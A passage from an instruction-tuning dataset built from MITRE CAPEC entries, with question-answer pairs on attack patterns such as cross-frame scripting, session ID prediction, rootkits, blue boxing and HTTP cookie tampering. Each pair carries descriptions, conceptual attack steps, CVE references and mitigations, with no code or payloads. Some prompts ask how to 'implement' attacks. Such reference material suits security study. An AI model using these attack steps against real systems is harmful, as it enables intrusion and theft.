              "@External_Reference_ID": "REF-23",
              "@Section": "DNS Threats & Weaknesses of the Domain Name System"
            },
            {
              "@External_Reference_ID": "REF-27"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Cross Frame Scripting (XFS) (CAPEC ID: 587)",
    "context": "",
    "output": "Examples of Cross Frame Scripting (XFS) (CAPEC ID: 587) are: An adversary-controlled webpage contains malicious Javascript and a concealed iframe containing a legitimate website login (i.e., the concealed iframe would make it appear as though the actual legitimate website was loaded). When the user interacts with the legitimate website in the iframe, the malicious Javascript collects that sensitive information.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary-controlled webpage contains malicious Javascript and a concealed iframe containing a legitimate website login (i.e., the concealed iframe would make it appear as though the actual legitimate website was loaded). When the user interacts with the legitimate website in the iframe, the malicious Javascript collects that sensitive information.",
      "@Name": "Cross Frame Scripting (XFS) (CAPEC ID: 587)",
      "attack_ptrn": {
        "@ID": "587",
        "@Name": "Cross Frame Scripting (XFS)",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack pattern combines malicious Javascript and a legitimate webpage loaded into a concealed iframe. The malicious Javascript is then able to interact with a legitimate webpage in a manner that is unknown to the user. This attack usually leverages some element of social engineering in that an attacker must convinces a user to visit a web page that the attacker controls.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "103",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "The user's browser must have vulnerabilities in its implementation of the same-origin policy. It allows certain data in a loaded page to originate from different servers/domains."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Note": "Cross Frame Scripting allows an adversary to steal sensitive data from a legitimate site."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Avoid clicking on untrusted links.",
            "Employ techniques such as frame busting, which is a method by which developers aim to prevent their site being loaded within a frame."
          ]
        },
        "Example_Instances": {
          "Example": "An adversary-controlled webpage contains malicious Javascript and a concealed iframe containing a legitimate website login (i.e., the concealed iframe would make it appear as though the actual legitimate website was loaded). When the user interacts with the legitimate website in the iframe, the malicious Javascript collects that sensitive information."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1021"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Cross Frame Scripting"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-469"
            },
            {
              "@External_Reference_ID": "REF-470"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2017-02-01"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated @Abstraction, Mitigations, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Session Credential Falsification through Prediction (CAPEC ID: 59)",
    "context": "",
    "output": "Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969\n- mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969",
        "mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534"
      ],
      "@Name": "Session Credential Falsification through Prediction (CAPEC ID: 59)",
      "attack_ptrn": {
        "@ID": "59",
        "@Name": "Session Credential Falsification through Prediction",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "196"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Find Session IDs] The attacker interacts with the target host and finds that session IDs are used to authenticate users.",
              "Technique": [
                "An attacker makes many anonymous connections and records the session IDs assigned.",
                "An attacker makes authorized connections and records the session tokens or credentials issued."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Characterize IDs] The attacker studies the characteristics of the session ID (size, format, etc.). As a results the attacker finds that legitimate session IDs are predictable.",
              "Technique": [
                "Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.",
                "Pattern tests. The attacker looks for patterns (odd/even, repetition, multiples, or other arithmetic relationships) between IDs",
                "Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Match issued IDs] The attacker brute forces different values of session ID and manages to predict a valid session ID.",
              "Technique": "The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use matched Session ID] The attacker uses the falsified session ID to access the target system.",
              "Technique": [
                "The attacker loads the session ID into their web browser and browses to restricted data or functionality.",
                "The attacker loads the session ID into their network communications and impersonates a legitimate user to gain access to data or functionality."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target host uses session IDs to keep track of the users.",
            "Session IDs are used to control access to resources.",
            "The session IDs used by the target host are predictable. For example, the session IDs are generated using predictable information (e.g., time)."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "There are tools to brute force session ID. Those tools require a low level of knowledge."
            },
            {
              "@Level": "Medium",
              "#text": "Predicting Session ID may require more computation work which uses advanced analysis such as statistical analysis."
            }
          ]
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Use a strong source of randomness to generate a session ID.",
            "Use adequate length session IDs",
            "Do not use information available to the user in order to generate session ID (e.g., time).",
            "Ideas for creating random numbers are offered by Eastlake [RFC1750]",
            "Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969",
            "mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534"
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "330"
            },
            {
              "@CWE_ID": "331"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "488"
            },
            {
              "@CWE_ID": "539"
            },
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "6"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "384"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "18",
              "Entry_Name": "Credential/Session Prediction"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Session Prediction"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Install Rootkit  (CAPEC ID: 552)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Install Rootkit  (CAPEC ID: 552) are: A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.\n- Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.",
        "Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly."
      ],
      "@Name": "Install Rootkit  (CAPEC ID: 552)",
      "attack_ptrn": {
        "@ID": "552",
        "@Name": "Install Rootkit ",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "542"
          }
        },
        "Mitigations": {
          "Mitigation": "Prevent adversary access to privileged accounts necessary to install rootkits."
        },
        "Example_Instances": {
          "Example": [
            "A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.",
            "Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "284"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1014",
              "Entry_Name": "Rootkit"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1542.003",
              "Entry_Name": "Pre-OS Boot:Bootkit"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1547.006",
              "Entry_Name": "Boot or Logon Autostart Execution:Kernel Modules and Extensions"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, References, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Blue Boxing (CAPEC ID: 5)",
    "context": "",
    "output": "An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available.",
      "@Name": "Blue Boxing (CAPEC ID: 5)",
      "attack_ptrn": {
        "@ID": "5",
        "@Name": "Blue Boxing",
        "@Abstraction": "Detailed",
        "@Status": "Obsolete",
        "Description": {
          "xhtml:p": [
            "This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.",
            {
              "xhtml:b": "This attack pattern is included in CAPEC for historical purposes."
            }
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "220"
          }
        },
        "Prerequisites": {
          "Prerequisite": "System must use weak authentication mechanisms for administrative functions."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades."
          }
        },
        "Resources_Required": {
          "Resource": "CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implementation: Upgrade phone lines. Note this may be prohibitively expensive",
            "Use strong access control such as two factor access control for administrative access to the switch"
          ]
        },
        "Example_Instances": {
          "Example": "An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "285"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated @Status, Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Infected Memory (CAPEC ID: 456)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Infected Memory (CAPEC ID: 456) are: A USB Memory stick has malicious logic inserted before shipping of the product allowing for infection of the host machine once inserted into the USB port.\n* In 2007, approximately 1800 of Seagate's Maxtor Personal Storage 3200 drives were built under contract with an outside manufacturer and contained a virus that stole user passwords.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A USB Memory stick has malicious logic inserted before shipping of the product allowing for infection of the host machine once inserted into the USB port.",
        "In 2007, approximately 1800 of Seagate's Maxtor Personal Storage 3200 drives were built under contract with an outside manufacturer and contained a virus that stole user passwords."
      ],
      "@Name": "Infected Memory (CAPEC ID: 456)",
      "attack_ptrn": {
        "@ID": "456",
        "@Name": "Infected Memory",
        "@Abstraction": "Standard",
        "@Status": "Stable",
        "Description": "An adversary inserts malicious logic into memory enabling them to achieve a negative impact. This logic is often hidden from the user of the system and works behind the scenes to achieve negative impacts. This pattern of attack focuses on systems already fielded and used in operation as opposed to systems that are still under development and part of the supply chain.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "441",
            "Exclude_Related": {
              "@Exclude_ID": "437"
            }
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Authorization",
            "Impact": "Execute Unauthorized Commands"
          }
        },
        "Mitigations": {
          "Mitigation": "Leverage anti-virus products to detect stop operations with known virus."
        },
        "Example_Instances": {
          "Example": [
            "A USB Memory stick has malicious logic inserted before shipping of the product allowing for infection of the host machine once inserted into the USB port.",
            "In 2007, approximately 1800 of Seagate's Maxtor Personal Storage 3200 drives were built under contract with an outside manufacturer and contained a virus that stole user passwords."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "1257"
            },
            {
              "@CWE_ID": "1260"
            },
            {
              "@CWE_ID": "1274"
            },
            {
              "@CWE_ID": "1312"
            },
            {
              "@CWE_ID": "1316"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Description Summary, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2018-07-31",
            "#text": "Malicious Logic Insertion into Product Memory"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Malicious Gray Market Hardware (CAPEC ID: 535), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An attacker develops co-processor boards with malicious capabilities that are technically the same as a manufacturer's expensive upgrade to their flagship system. The victim has installed the manufacturer's base system without the expensive upgrade. The attacker contacts the victim and states they have the co-processor boards at a drastically-reduced price, falsely stating they were acquired from a bankruptcy liquidation of a company that had purchased them from the manufacturer. The victim after hearing the drastically reduced price decides to take advantage of the situation and purchases the upgrades from the attacker, and installs them. This allows the attacker to further compromise the victim.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An attacker develops co-processor boards with malicious capabilities that are technically the same as a manufacturer's expensive upgrade to their flagship system. The victim has installed the manufacturer's base system without the expensive upgrade. The attacker contacts the victim and states they have the co-processor boards at a drastically-reduced price, falsely stating they were acquired from a bankruptcy liquidation of a company that had purchased them from the manufacturer. The victim after hearing the drastically reduced price decides to take advantage of the situation and purchases the upgrades from the attacker, and installs them. This allows the attacker to further compromise the victim.",
      "@Name": "Malicious Gray Market Hardware (CAPEC ID: 535)",
      "attack_ptrn": {
        "@ID": "535",
        "@Name": "Malicious Gray Market Hardware",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker maliciously alters hardware components that will be sold on the gray market, allowing for victim disruption and compromise when the victim needs replacement hardware components for systems where the parts are no longer in regular supply from original suppliers, or where the hardware components from the attacker seems to be a great benefit from a cost perspective.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "531"
          }
        },
        "Prerequisites": {
          "Prerequisite": "Physical access to a gray market reseller's hardware components supply, or the ability to appear as a gray market reseller to the victim's buyer."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop and manufacture malicious hardware components that perform the same functions and processes as their non-malicious counterparts."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Purchase only from authorized resellers.",
            "Validate serial numbers from multiple sources"
          ]
        },
        "Example_Instances": {
          "Example": "An attacker develops co-processor boards with malicious capabilities that are technically the same as a manufacturer's expensive upgrade to their flagship system. The victim has installed the manufacturer's base system without the expensive upgrade. The attacker contacts the victim and states they have the co-processor boards at a drastically-reduced price, falsely stating they were acquired from a bankruptcy liquidation of a company that had purchased them from the manufacturer. The victim after hearing the drastically reduced price decides to take advantage of the situation and purchases the upgrades from the attacker, and installs them. This allows the attacker to further compromise the victim."
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-439"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Examples-Instances, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Accessing/Intercepting/Modifying HTTP Cookies (CAPEC ID: 31)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "There are two main attack vectors for exploiting poorly protected session variables like cookies. One is the local machine itself which can be exploited directly at the physical level or indirectly through XSS and phishing. In addition, the adversary in the middle attack (CAPEC-94) relies on a network sniffer, proxy, or other intermediary to intercept the subject's credentials and use them to impersonate the digital subject on the host. The issue is that once the credentials are intercepted, impersonation is trivial for the adversary to accomplish if no other protection mechanisms are in place. See also: CVE-2010-5148 , CVE-2016-0353",
      "@Name": "Accessing/Intercepting/Modifying HTTP Cookies (CAPEC ID: 31)",
      "attack_ptrn": {
        "@ID": "31",
        "@Name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems. There are several different forms of this attack. The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein. The second form involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the adversary to impersonate the remote user/session. The third form is when the cookie's content is modified by the adversary before it is sent back to the server. Here the adversary seeks to convince the target server to operate on this falsified information.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "39"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "157",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain copy of cookie] The adversary first needs to obtain a copy of the cookie. The adversary may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.",
              "Technique": [
                "Sniff cookie using a network sniffer such as Wireshark",
                "Obtain cookie using a utility such as the Firefox Cookie Manager, Chrome DevTools or AnEC Cookie Editor.",
                "Steal cookie via a cross-site scripting attack.",
                "Guess cookie contents if it contains predictable information."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Obtain sensitive information from cookie] The adversary may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.",
              "Technique": [
                "If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.",
                "Analyze the cookie's contents to determine whether it contains any sensitive information."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Modify cookie to subvert security controls.] The adversary may be able to modify or replace cookies to bypass security controls in the application.",
              "Technique": [
                "Modify logical parts of cookie and send it back to server to observe the effects.",
                "Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.",
                "Modify cookie bitwise and send it back to server to observe the effects.",
                "Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a \"points balance\" for a given user where the points have some value. The user may spend their points and then replace their cookie with an older one to restore their balance."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Target server software must be a HTTP daemon that relies on cookies.",
            "The cookies must contain sensitive information.",
            "The adversary must be able to make HTTP requests to the server, and the cookie must be contained in the reply."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To overwrite session cookie data, and submit targeted attacks via HTTP"
            },
            {
              "@Level": "High",
              "#text": "Exploiting a remote buffer overflow generated by attack"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "A utility that allows for the viewing and modification of cookies. Many modern web browsers support this behavior."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use input validation for cookies",
            "Design: Generate and validate MAC for cookies",
